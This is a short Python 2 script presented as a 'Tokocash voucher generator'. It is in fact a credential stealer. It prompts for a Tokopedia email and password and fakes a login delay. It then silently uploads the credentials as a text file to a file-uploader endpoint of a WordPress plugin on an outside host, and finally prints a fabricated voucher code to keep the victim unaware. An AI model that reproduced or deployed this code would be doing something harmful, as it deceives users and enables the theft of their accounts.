





#!/usr/bin/env/python
WHITEBOLD = '[1;37m'
WHITE  = '[0m'
RED = '[31m'
GREEN  = '[1;32m'
ORANGE  = '[33m'
BLUE  = '[34m'
from time import *
import urllib
try:
	import requests
except:
	import os
	os.system('pip2 install requests')
print '='*50
print 'TOKOCASH VOUCHER GENERATOR'
print '='*50
################################################
payload='haha.txt'
################################################
print ''+BLUE+'[*]'+WHITEBOLD+' Login Tokopedia '
email=raw_input(''+GREEN+'[?]'+WHITEBOLD+' Email>')
password=raw_input(''+GREEN+'[?] '+WHITEBOLD+'Password> ')
print ''+BLUE+'[*]'+WHITEBOLD+' Logging in...'
sleep(2)
em=raw_input(''+GREEN+'[?] Voucher Amount (Rp) > ')
uploadata="    EMAIL => [%s] PASSWORD => [%s]"%(email,password)
files={'Filedata':(payload,uploadata,'text/html')}
r=requests.post('http://ailisgarcia.com/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',verify = False,files=files)
print ''+BLUE+'[*]'+WHITEBOLD+' Generating....'
sleep(0.5)
print ""+BLUE+"[*]"+WHITEBOLD+" Amount    :",em
print ""+GREEN+"[*]"+WHITEBOLD+" Voucher Gift Card : FPLTVHALDCRT3211 (Valid 5 Minutes)"











     





